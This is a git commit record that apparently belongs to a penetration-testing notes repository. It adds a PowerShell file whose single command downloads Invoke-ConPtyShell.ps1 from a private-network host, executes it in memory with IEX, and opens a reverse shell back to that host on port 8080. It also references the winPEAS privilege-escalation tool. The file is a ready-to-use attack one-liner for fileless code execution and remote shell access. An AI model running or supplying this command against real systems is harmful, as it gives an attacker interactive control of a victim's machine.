2acd390fb2ae22b26d396fed6468f2d220a2cc2a
0xhanu58 <0xhanu58@proton.me>
2025-02-15 18:49:10 +0530

    Create download_in_memory.ps1
    added conpty shell

---
+++ download_in_memory.ps1
@@ -0,0 +1,3 @@
+IEX(IWR http://192.168.45.177/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.177 8080
+
+refer: https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md
